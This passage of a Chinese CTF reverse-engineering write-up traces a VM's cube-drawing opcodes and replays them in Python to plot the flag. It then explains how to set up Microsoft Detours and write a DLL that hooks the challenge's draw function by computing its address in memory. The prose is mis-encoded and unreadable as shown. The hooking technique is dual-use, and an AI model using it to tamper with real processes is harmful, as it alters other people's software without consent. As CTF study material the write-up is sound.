-&gt; 0xe82b18</span><br><span class="line">reg[0] = reg[1] -&gt; 0x1cf400</span><br><span class="line">reg[1] = reg[3] -&gt; 0xe82b18</span><br><span class="line">reg[6] = reg[0] -&gt; 0x1cf400</span><br><span class="line">reg[7] = reg[1] -&gt; 0xe82b18</span><br><span class="line">Draw yellow cube with args: 0x000032, 0x0000e6, 0x1cf400, 0xe82b18</span><br><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[4] = reg[0] -&gt; 0x000032</span><br><span class="line">reg[0] = reg[4] -&gt; 0x000032</span><br><span class="line">reg[1] = 1000 -&gt; 0x0003e8</span><br><span class="line">reg[0](0x000032) -= reg[1](0x0003e8) -&gt; -0x003b6</span><br><span class="line">reg[4] = reg[0] -&gt; -0x003b6</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 240 -&gt; 0x0000f0</span><br><span class="line">reg[0](0x000032) += reg[1](0x0000f0) -&gt; 0x000122</span><br><span class="line">reg[5] = reg[0] -&gt; 0x000122</span><br><span class="line">reg[0] = reg[5] -&gt; 0x000122</span><br><span class="line">reg[1] = 500 -&gt; 0x0001f4</span><br><span class="line">reg[0](0x000122) -= reg[1](0x0001f4) -&gt; -0x000d2</span><br><span class="line">reg[5] = reg[0] -&gt; -0x000d2</span><br><span class="line">reg[0] = reg[4] -&gt; -0x003b6</span><br><span class="line">reg[1] = reg[5] -&gt; -0x000d2</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0x391faa, 0x6ee6d2</span><br><span class="line">reg[6] = reg[0] -&gt; 0x391faa</span><br><span class="line">reg[7] = reg[1] -&gt; 0x6ee6d2</span><br><span class="line">Draw yellow cube with args: -0x003b6, -0x000d2, 0x391faa, 0x6ee6d2</span><br><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[4] = reg[0] -&gt; 0x000032</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 300 -&gt; 0x00012c</span><br><span class="line">reg[0](0x000032) += reg[1](0x00012c) -&gt; 0x00015e</span><br><span class="line">reg[5] = reg[0] -&gt; 0x00015e</span><br><span class="line">reg[0] = reg[4] -&gt; 0x000032</span><br><span class="line">reg[1] = reg[5] -&gt; 0x00015e</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0xd77de2, 0x0ebe72</span><br><span class="line">reg[3] = reg[0] -&gt; 0xd77de2</span><br><span class="line">reg[0] = reg[1] -&gt; 0x0ebe72</span><br><span class="line">reg[1] = reg[3] -&gt; 0xd77de2</span><br><span class="line">reg[6] = reg[0] -&gt; 0x0ebe72</span><br><span class="line">reg[7] = reg[1] -&gt; 0xd77de2</span><br><span class="line">Draw yellow cube with args: 0x000032, 0x00015e, 0x0ebe72, 0xd77de2</span><br><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[1] = 60 -&gt; 0x00003c</span><br><span class="line">reg[0](0x000032) += reg[1](0x00003c) -&gt; 0x00006e</span><br><span class="line">reg[4] = reg[0] -&gt; 0x00006e</span><br><span class="line">reg[0] = reg[4] -&gt; 0x00006e</span><br><span class="line">reg[1] = 1000 -&gt; 0x0003e8</span><br><span class="line">reg[0](0x00006e) -= reg[1](0x0003e8) -&gt; -0x0037a</span><br><span class="line">reg[4] = reg[0] -&gt; -0x0037a</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 180 -&gt; 0x0000b4</span><br><span class="line">reg[0](0x000032) += reg[1](0x0000b4) -&gt; 0x0000e6</span><br><span class="line">reg[5] = reg[0] -&gt; 0x0000e6</span><br><span class="line">reg[0] = reg[5] -&gt; 0x0000e6</span><br><span class="line">reg[1] = 500 -&gt; 0x0001f4</span><br><span class="line">reg[0](0x0000e6) -= reg[1](0x0001f4) -&gt; -0x0010e</span><br><span class="line">reg[5] = reg[0] -&gt; -0x0010e</span><br><span class="line">reg[0] = reg[4] -&gt; -0x0037a</span><br><span class="line">reg[1] = reg[5] -&gt; -0x0010e</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0x071150, 0x74fc28</span><br><span class="line">reg[6] = reg[0] -&gt; 0x071150</span><br><span class="line">reg[7] = reg[1] -&gt; 0x74fc28</span><br><span class="line">Draw yellow cube with args: -0x0037a, -0x0010e, 0x071150, 0x74fc28</span><br><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[1] = 120 -&gt; 0x000078</span><br><span class="line">reg[0](0x000032) += reg[1](0x000078) -&gt; 0x0000aa</span><br><span class="line">reg[4] = reg[0] -&gt; 0x0000aa</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 180 -&gt; 0x0000b4</span><br><span class="line">reg[0](0x000032) += reg[1](0x0000b4) -&gt; 0x0000e6</span><br><span class="line">reg[5] = reg[0] -&gt; 0x0000e6</span><br><span class="line">reg[0] = reg[5] -&gt; 0x0000e6</span><br><span class="line">reg[1] = 500 -&gt; 0x0001f4</span><br><span class="line">reg[0](0x0000e6) -= reg[1](0x0001f4) -&gt; -0x0010e</span><br><span class="line">reg[5] = reg[0] -&gt; -0x0010e</span><br><span class="line">reg[0] = reg[4] -&gt; 0x0000aa</span><br><span class="line">reg[1] = reg[5] -&gt; -0x0010e</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0xc42e8b, 0xdb3f17</span><br><span class="line">reg[3] = reg[0] -&gt; 0xc42e8b</span><br><span class="line">reg[0] = reg[1] -&gt; 0xdb3f17</span><br><span class="line">reg[1] = reg[3] -&gt; 0xc42e8b</span><br><span class="line">reg[6] = reg[0] -&gt; 0xdb3f17</span><br><span class="line">reg[7] = reg[1] -&gt; 0xc42e8b</span><br><span class="line">Draw yellow cube with args: 0x0000aa, -0x0010e, 0xdb3f17, 0xc42e8b</span><br><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[1] = 180 -&gt; 0x0000b4</span><br><span class="line">reg[0](0x000032) += reg[1](0x0000b4) -&gt; 0x0000e6</span><br><span class="line">reg[4] = reg[0] -&gt; 0x0000e6</span><br><span class="line">reg[0] = reg[4] -&gt; 0x0000e6</span><br><span class="line">reg[1] = 1000 -&gt; 0x0003e8</span><br><span class="line">reg[0](0x0000e6) -= reg[1](0x0003e8) -&gt; -0x00302</span><br><span class="line">reg[4] = reg[0] -&gt; -0x00302</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 180 -&gt; 0x0000b4</span><br><span class="line">reg[0](0x000032) += reg[1](0x0000b4) -&gt; 0x0000e6</span><br><span class="line">reg[5] = reg[0] -&gt; 0x0000e6</span><br><span class="line">reg[0] = reg[4] -&gt; -0x00302</span><br><span class="line">reg[1] = reg[5] -&gt; 0x0000e6</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0x34cf2b, 0x331fcf</span><br><span class="line">reg[6] = reg[0] -&gt; 0x34cf2b</span><br><span class="line">reg[7] = reg[1] -&gt; 0x331fcf</span><br><span class="line">Draw yellow cube with args: -0x00302, 0x0000e6, 0x34cf2b, 0x331fcf</span><br><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[1] = 60 -&gt; 0x00003c</span><br><span class="line">reg[0](0x000032) += reg[1](0x00003c) -&gt; 0x00006e</span><br><span class="line">reg[4] = reg[0] -&gt; 0x00006e</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 60 -&gt; 0x00003c</span><br><span class="line">reg[0](0x000032) += reg[1](0x00003c) -&gt; 0x00006e</span><br><span class="line">reg[5] = reg[0] -&gt; 0x00006e</span><br><span class="line">reg[0] = reg[5] -&gt; 0x00006e</span><br><span class="line">reg[1] = 500 -&gt; 0x0001f4</span><br><span class="line">reg[0](0x00006e) -= reg[1](0x0001f4) -&gt; -0x00186</span><br><span class="line">reg[5] = reg[0] -&gt; -0x00186</span><br><span class="line">reg[0] = reg[4] -&gt; 0x00006e</span><br><span class="line">reg[1] = reg[5] -&gt; -0x00186</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0xd9e5f1, 0xa59d19</span><br><span class="line">reg[3] = reg[0] -&gt; 0xd9e5f1</span><br><span class="line">reg[0] = reg[1] -&gt; 0xa59d19</span><br><span class="line">reg[1] = reg[3] -&gt; 0xd9e5f1</span><br><span class="line">reg[6] = reg[0] -&gt; 0xa59d19</span><br><span class="line">reg[7] = reg[1] -&gt; 0xd9e5f1</span><br><span class="line">Draw yellow cube with args: 0x00006e, -0x00186, 0xa59d19, 0xd9e5f1</span><br><span class="line">reg[0] = reg[8] -&gt; 0x000032</span><br><span class="line">reg[1] = 120 -&gt; 0x000078</span><br><span class="line">reg[0](0x000032) += reg[1](0x000078) -&gt; 0x0000aa</span><br><span class="line">reg[4] = reg[0] -&gt; 0x0000aa</span><br><span class="line">reg[0] = reg[4] -&gt; 0x0000aa</span><br><span class="line">reg[1] = 1000 -&gt; 0x0003e8</span><br><span class="line">reg[0](0x0000aa) -= reg[1](0x0003e8) -&gt; -0x0033e</span><br><span class="line">reg[4] = reg[0] -&gt; -0x0033e</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 120 -&gt; 0x000078</span><br><span class="line">reg[0](0x000032) += reg[1](0x000078) -&gt; 0x0000aa</span><br><span class="line">reg[5] = reg[0] -&gt; 0x0000aa</span><br><span class="line">reg[0] = reg[4] -&gt; -0x0033e</span><br><span class="line">reg[1] = reg[5] -&gt; 0x0000aa</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0xc42d8b, 0xcb5fe7</span><br><span class="line">reg[3] = reg[0] -&gt; 0xc42d8b</span><br><span class="line">reg[0] = reg[1] -&gt; 0xcb5fe7</span><br><span class="line">reg[1] = reg[3] -&gt; 0xc42d8b</span><br><span class="line">reg[6] = reg[0] -&gt; 0xcb5fe7</span><br><span class="line">reg[7] = reg[1] -&gt; 0xc42d8b</span><br><span class="line">Draw yellow cube with args: -0x0033e, 0x0000aa, 0xcb5fe7, 0xc42d8b</span><br><span class="line">...</span><br><span class="line">reg[0] = reg[4] -&gt; 0x0004e2</span><br><span class="line">reg[1] = reg[5] -&gt; 0x000122</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0x353730, 0x383434</span><br><span class="line">reg[6] = reg[0] -&gt; 0x353730</span><br><span class="line">reg[7] = reg[1] -&gt; 0x383434</span><br><span class="line">Draw blue   cube with args: 0x0004e2, 0x000122, 0x353730, 0x383434</span><br><span class="line">reg[0] = reg[8] -&gt; 0x0003b6</span><br><span class="line">reg[1] = 360 -&gt; 0x000168</span><br><span class="line">reg[0](0x0003b6) += reg[1](0x000168) -&gt; 0x00051e</span><br><span class="line">reg[4] = reg[0] -&gt; 0x00051e</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 240 -&gt; 0x0000f0</span><br><span class="line">reg[0](0x000032) += reg[1](0x0000f0) -&gt; 0x000122</span><br><span class="line">reg[5] = reg[0] -&gt; 0x000122</span><br><span class="line">reg[0] = reg[4] -&gt; 0x00051e</span><br><span class="line">reg[1] = reg[5] -&gt; 0x000122</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0x6257a9, 0x9555e9</span><br><span class="line">reg[6] = reg[0] -&gt; 0x6257a9</span><br><span class="line">reg[7] = reg[1] -&gt; 0x9555e9</span><br><span class="line">Draw blue   cube with args: 0x00051e, 0x000122, 0x6257a9, 0x9555e9</span><br><span class="line">reg[0] = reg[8] -&gt; 0x0003b6</span><br><span class="line">reg[1] = 420 -&gt; 0x0001a4</span><br><span class="line">reg[0](0x0003b6) += reg[1](0x0001a4) -&gt; 0x00055a</span><br><span class="line">reg[4] = reg[0] -&gt; 0x00055a</span><br><span class="line">reg[0] = reg[9] -&gt; 0x000032</span><br><span class="line">reg[1] = 240 -&gt; 0x0000f0</span><br><span class="line">reg[0](0x000032) += reg[1](0x0000f0) -&gt; 0x000122</span><br><span class="line">reg[5] = reg[0] -&gt; 0x000122</span><br><span class="line">reg[0] = reg[4] -&gt; 0x00055a</span><br><span class="line">reg[1] = reg[5] -&gt; 0x000122</span><br><span class="line">Decode reg[0] and reg[1] -&gt; 0xd777af, 0xdf5bd3</span><br><span class="line">reg[6] = reg[0] -&gt; 0xd777af</span><br><span class="line">reg[7] = reg[1] -&gt; 0xdf5bd3</span><br><span class="line">Draw blue   cube with args: 0x00055a, 0x000122, 0xd777af, 0xdf5bd3</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¦ç»˜åˆ¶é»„è‰²æ–¹å—è®¡ç®—åæ ‡æ—¶æœ‰å¥½å‡ ä¸ªæ–¹å—çš„åæ ‡éƒ½è¢«å‡å»äº†ä¸€ä¸ªå¾ˆå¤§çš„æ•°å¯¼è‡´å…¶å˜ä¸ºäº†è´Ÿæ•° å¹¶ä¸”ç¬¬3, 4ä¸ªå‚æ•°æ˜¯åœ¨æ¯ä¸€æ¬¡è®¡ç®—å‡ºå½“å‰è¦ç»˜åˆ¶çš„x, yåæ ‡åé€šè¿‡opcodeä¸º4çš„ä¸€è¿ä¸²è¿ç®—å¾—åˆ°çš„ è¿™ä¸€è¿ä¸²è¿ç®—çš„å‚æ•°å°±æ˜¯xå’Œyåæ ‡ ä¹Ÿå°±æ˜¯è¯´ç¬¬3, 4ä¸ªå‚æ•°å¤§æ¦‚ç‡æ˜¯ä¸¤ä¸ªåæ ‡çš„æ ¡éªŒå€¼</p>
<p>é™¤æ­¤ä¹‹å¤–è¿˜èƒ½å¤Ÿè§‚å¯Ÿå‡ºæ¥åœ¨è®¡ç®—è¦ç»˜åˆ¶çš„é»„è‰²æ–¹å—åæ ‡æ—¶æœ¬æ¥å‡ºç°è¿‡ä¸€ä¸ªæ¯”è¾ƒæ­£å¸¸åƒæ˜¯åæ ‡çš„å€¼ ä½†æ˜¯è¿™ä¸ªå€¼è¢«å‡å»äº†ä¸€ä¸ªè¾ƒå¤§çš„æ•°å€¼å¯¼è‡´å…¶å˜ä¸ºè´Ÿæ•° è€Œä¸¤ä¸ªåæ ‡éƒ½æ­£å¸¸çš„æƒ…å†µä¸‹å’Œè“è‰²æ–¹å—æ ¡éªŒå€¼çš„è®¡ç®—è¿‡ç¨‹ç›¸æ¯”è¾ƒ è¿™äº›é»„è‰²æ–¹å—çš„æ ¡éªŒå€¼è¢«äº¤æ¢äº†ä½ç½®:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-101501.png" alt="image-20250326101501344"></p>
<p>è¿™åº”è¯¥å°±æ˜¯é»„è‰²æ–¹å—æ²¡æœ‰è¢«æ­£ç¡®ç»˜åˆ¶çš„ä¸¤ä¸ªåŸå› </p>
<p>æ¥ä¸‹æ¥å…ˆéªŒè¯ä¸€ä¸‹æƒ³æ³•çš„æ­£ç¡®æ€§ åœ¨pythoné‡Œçœ‹ä¸€ä¸‹å°†è´Ÿæ•°ä¿®æ­£åæ˜¯å¦èƒ½æ­£ç¡®ç»˜åˆ¶flag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">opcode = [</span><br><span class="line">    <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, ...</span><br><span class="line">]</span><br><span class="line">mask = ((<span class="number">1</span> &lt;&lt; <span class="number">32</span>) - <span class="number">1</span>)</span><br><span class="line">yellow_points = []</span><br><span class="line">Blue_points = []</span><br><span class="line">...</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                res = <span class="string">f&quot;reg[0](<span class="subst">&#123;reg[<span class="number">0</span>] :#08x&#125;</span>) -= reg[1](<span class="subst">&#123;reg[<span class="number">1</span>] :#08x&#125;</span>) -&gt; <span class="subst">&#123;reg[<span class="number">0</span>] - reg[<span class="number">1</span>] :#08x&#125;</span>&quot;</span></span><br><span class="line">                reg[<span class="number">0</span>] -= reg[<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span> reg[<span class="number">0</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                    reg[<span class="number">0</span>] += reg[<span class="number">1</span>]</span><br><span class="line">                    res += <span class="string">f&#x27;, fix =&gt; <span class="subst">&#123;reg[<span class="number">0</span>] :#08x&#125;</span>&#x27;</span></span><br><span class="line">...</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                res = <span class="string">f&quot;Draw yellow cube with args: <span class="subst">&#123;reg[<span class="number">4</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">5</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">6</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">7</span>]:#08x&#125;</span>&quot;</span></span><br><span class="line">                yellow_points.append((reg[<span class="number">4</span>], reg[<span class="number">5</span>]))</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                res = <span class="string">f&quot;Draw blue   cube with args: <span class="subst">&#123;reg[<span class="number">4</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">5</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">6</span>]:#08x&#125;</span>, <span class="subst">&#123;reg[<span class="number">7</span>]:#08x&#125;</span>&quot;</span></span><br><span class="line">                Blue_points.append((reg[<span class="number">4</span>], reg[<span class="number">5</span>]))</span><br><span class="line">...</span><br><span class="line">yellow_points = [(x, -y) <span class="keyword">for</span> x, y <span class="keyword">in</span> yellow_points]</span><br><span class="line">Blue_points = [(x, -y) <span class="keyword">for</span> x, y <span class="keyword">in</span> Blue_points]</span><br><span class="line">x, y = <span class="built_in">zip</span>(*yellow_points)</span><br><span class="line">plt.scatter(x, y, label=<span class="string">&quot;Yellow Points&quot;</span>, color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">x, y = <span class="built_in">zip</span>(*Blue_points)</span><br><span class="line">plt.scatter(x, y, label=<span class="string">&quot;Blue Points&quot;</span>, color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.title(<span class="string">&#x27;Points&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-110820.png" alt="image-20250326110820053"></p>
<p>å¯ä»¥çœ‹åˆ°å·²ç»æ­£ç¡®ç»˜åˆ¶äº† é‚£ä¹ˆæ¥ä¸‹æ¥åªéœ€è¦è®°å½•ä¸€ä¸‹æ­£ç¡®çš„ä½ç½®å’Œæ ¡éªŒå€¼å‚æ•°å¹¶è°ƒæ•´è¢«äº¤æ¢çš„æ ¡éªŒå€¼å°±èƒ½ç»˜åˆ¶flagäº† è®°å½•å¾—åˆ°:</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line">x:50, 50, 50, 50, 50, 50, 110, 170, 230, 110, 170</span><br><span class="line">y:50, 110, 170, 230, 290, 350, 230, 230, 230, 110, 170</span><br><span class="line">arg3: 0xf814b4, 0x1bcd69, 0x87a34b, 0x1cf400, 0x391faa, 0xebe72, 0x71150, 0xc7371b, 0x34cf2b, 0xd1b52d, 0xb36fdf</span><br><span class="line">arg4: 0x130bd0, 0x7515c9, 0xd91997, 0xe82b18, 0x520efe, 0xd77de2, 0x788404, 0xc42e8b, 0x5b8fe7, 0xd9e5f1, 0xc42d8b</span><br><span class="line">swap: 0, 2, 3, 5, 7, 9, 10</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢ä»‹ç»é€šè¿‡<code>Detours</code>APIè¿›è¡ŒDLLç¼–å†™å’Œå‡½æ•°hookçš„è¿‡ç¨‹</p>
<h2 id="ç¼–å†™DLLè¿›è¡Œhook"><a href="#ç¼–å†™DLLè¿›è¡Œhook" class="headerlink" title="ç¼–å†™DLLè¿›è¡Œhook"></a>ç¼–å†™DLLè¿›è¡Œhook</h2><h3 id="å®‰è£…Detoursåº“"><a href="#å®‰è£…Detoursåº“" class="headerlink" title="å®‰è£…Detoursåº“"></a>å®‰è£…Detoursåº“</h3><p>å¯ä»¥ç›´æ¥å»<a href="https://github.com/microsoft/Detours">å®˜æ–¹ä»“åº“</a>ä¸‹è½½å‘è¡Œç‰ˆæœ¬ ä¹Ÿå¯ä»¥é€šè¿‡vcpkgæ‹‰å– è¿™é‡Œè®²ä¸€ä¸‹vcpkgå®‰è£…æ—¶è¸©çš„å‘</p>
<p>vcpkgç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶è¦å®‰è£…ä¸€äº›å¯¹ç‰ˆæœ¬æœ‰è¦æ±‚çš„ç»„ä»¶ åŒ…æ‹¬:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-112553.png" alt="image-20250326112553229"></p>
<p>è€Œå®ƒè‡ªå¸¦çš„ä¸‹è½½åŠŸèƒ½ä¼šåˆ—å‡ºä¸‹è½½æ–‡ä»¶çš„URLå¹¶æ£€æŸ¥æ‰€ä¸‹è½½çš„æ–‡ä»¶çš„SHA256 å…¶ä¸­æˆ‘çš„vcpkgåœ¨ä¸‹è½½powershellçš„æ—¶å€™å°±æŠ¥äº†æ ¡éªŒå¤±è´¥çš„é”™ è¿™ç§æƒ…å†µç›´æ¥å»å®ƒåˆ—å‡ºçš„URLé‚£é‡Œæ‰‹åŠ¨ä¸‹è½½å¹¶æ”¾åœ¨<code>vcpkg\downloads</code>ç›®å½•ä¸‹å³å¯</p>
<p>åˆå§‹åŒ–å®Œæˆåæ‰§è¡Œ<code>vcpkg install detours</code>å³å¯æ‹‰å–åˆ°detoursåº“</p>
<h3 id="é…ç½®é¡¹ç›®"><a href="#é…ç½®é¡¹ç›®" class="headerlink" title="é…ç½®é¡¹ç›®"></a>é…ç½®é¡¹ç›®</h3><p>IDEè¿™é‡Œé€‰æ‹©ä½¿ç”¨<code>Visual Studio 2022 Community</code>  æ–°å»ºé¡¹ç›®æ—¶é€‰æ‹©C++ç¼–å†™çš„åŠ¨æ€é“¾æ¥åº“:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-113306.png" alt="image-20250326113306838"></p>
<p>æ­£å¼å¼€å§‹ç¼–å†™dllå‰éœ€è¦å…ˆé…ç½®å¥½é¡¹ç›®çš„åŒ…å«ç›®å½•å’Œåº“ç›®å½• <code>é¡¹ç›®-&gt;xxxå’Œå±æ€§-&gt;VC++ç›®å½•-&gt;åŒ…å«ç›®å½•, åº“ç›®å½•</code></p>
<p>å› ä¸ºhookåŸºæœ¬ä¸Šå¿…é¡»è¦ç”¨åˆ°WindowsAPI æ‰€ä»¥è¦æŠŠ<code>Windows Kits\10\Include\%VERSION%\um</code>ä¹ŸåŠ å…¥åˆ°åŒ…å«ç›®å½•ä¸­(ç‰ˆæœ¬æ›¿æ¢æˆè‡ªå·±çš„) :</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-113845.png" alt="image-20250326113845140"></p>
<p>åŒç†åœ¨åº“ç›®å½•ä¸­æ·»åŠ detours.libçš„è·¯å¾„:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-113928.png" alt="image-20250326113928334"></p>
<p>è¿™é‡Œå†è®²ä¸€ä¸‹è¸©åˆ°çš„ç¬¬äºŒä¸ªå‘</p>
<p>å¦‚æœåŒ…å«ç›®å½•ä¸­æ·»åŠ äº†Windows Kitsåœ¨ç¼–å†™ä»£ç æ—¶ä»ç„¶ä¸èƒ½åŒ…å«<code>windows.h</code>çš„è¯å¯ä»¥æ£€æŸ¥ä¸€ä¸‹æ˜¯å¦é™¤äº†é€šè¿‡<code>Visual Studio Installer</code>å®‰è£…Windows Kitsè¿˜æ‰‹åŠ¨å®‰è£…äº†(ç”¨<code>Everything</code>æœç´¢<code>windows.h</code>çœ‹çœ‹æ˜¯å¦é™¤äº†VS2022ç›®å½•ä¸‹è¿˜å­˜åœ¨åˆ«çš„Windows Kits) å¦‚æœæ˜¯çš„è¯é€šè¿‡<code>è®¾ç½®-&gt;åº”ç”¨</code>å¸è½½æ‰€æœ‰Windows Kits</p>
<p>æ¥ä¸‹æ¥æˆ‘é€‰æ‹©çš„æ˜¯<a href="https://developer.microsoft.com/zh-cn/windows/downloads/sdk-archive/">æ‰‹åŠ¨ä¸‹è½½</a>ä¸€ä¸ªKits è¿™æ—¶å€™åº”è¯¥ä¹Ÿèƒ½å†é€šè¿‡VSInstallerå®‰è£…</p>
<p>å®Œæˆåå†ç¼–è¾‘åŒ…å«ç›®å½•å°†æ–°å®‰è£…çš„Kitsä¸‹çš„umç»™æ·»åŠ è¿›å»åº”è¯¥å°±èƒ½åŒ…å«<code>windows.h</code>äº†</p>
<h3 id="ç¼–å†™DLL"><a href="#ç¼–å†™DLL" class="headerlink" title="ç¼–å†™DLL"></a>ç¼–å†™DLL</h3><p>ä½¿ç”¨detoursè¿›è¡Œç›®æ ‡è¿›ç¨‹å‡½æ•°çš„hookåŸºæœ¬ä¸Šæ˜¯è¿™ä¸ªæ¨¡æ¿:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Start_Hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">DetourRestoreAfterWith</span>();</span><br><span class="line">    <span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">    <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">    <span class="built_in">DetourAttach</span>((PVOID*)&amp;pto_hook, my_hook);</span><br><span class="line">    <span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Exit_Hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">    <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">    <span class="built_in">DetourDetach</span>(&amp;(PVOID&amp;)bridge, (PVOID)pto_hook);</span><br><span class="line">    <span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>pto_hook</code>æ˜¯ç›®æ ‡è¿›ç¨‹ä¸­è¦hookçš„å‡½æ•°çš„è™šæ‹Ÿåœ°å€ <code>my_hook</code>ä¸ºè¦å°†<code>pto_hook</code>æ›¿æ¢æ‰çš„å‡½æ•°æŒ‡é’ˆ</p>
<p>åœ¨æœ¬é¢˜ä¸­ è¦hookçš„å‡½æ•°æ˜¯ç»˜åˆ¶æ–¹å—çš„å‡½æ•° ç›®æ ‡æ˜¯å½“æ£€æµ‹åˆ°å®ƒç»˜åˆ¶çš„æ˜¯é»„è‰²æ–¹å—æ—¶å°†å‰4ä¸ªå‚æ•°æ›¿æ¢æˆæ­£ç¡®çš„å‚æ•°</p>
<p>é—®é¢˜æ˜¯ç»˜åˆ¶å‡½æ•°æ˜¯é€šè¿‡shellcodeè§£ç å¹¶æ˜ å°„åˆ°ä¸€å—éšæœºçš„å†…å­˜ä¸­çš„ æˆ‘ä»¬è¿˜éœ€è¦è·å–ç»˜åˆ¶å‡½æ•°çš„åœ°å€ ç°åœ¨æˆ‘ä»¬çŸ¥é“ä½œä¸ºshellcodeå…¥å£ç‚¹çš„å‡½æ•°ä¼šå‚¨å­˜åˆ°dataæ®µä¸­:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F26%2F20250326-131412.png" alt="image-20250326131412136"></p>
<p>é‚£ä¹ˆåªéœ€è¦è·å–è¿›ç¨‹ä¸­çš„è¿™å—å†…å­˜å¹¶åŠ ä¸Šä¸€ä¸ªåç§»å°±èƒ½è·å–ç»˜åˆ¶å‡½æ•°çš„è™šæ‹Ÿåœ°å€äº† ç»è¿‡è°ƒè¯•å¯ä»¥è·å¾—è¿™ä¸ªåç§»ä¸º<code>-0x650</code></p>
<p>æ¥ä¸‹æ¥å°±åƒpwnä¸­ret2libcçš„æ–¹æ³•æ¥è®¡ç®—ç»˜åˆ¶å‡½æ•°çš„è™šæ‹Ÿåœ°å€:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__int64 dec_func = <span class="number">0x8318</span>, pto_hook;</span><br><span class="line">FILE* log_file = <span class="built_in">fopen</span>(<span class="string">&quot;log_.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Start_Hook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">DetourRestoreAfterWith</span>();</span><br><span class="line">    <span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line">    <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line">    __int64 to_hook = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE ProcessBase = <span class="built_in">GetModuleHandle</span>(<span 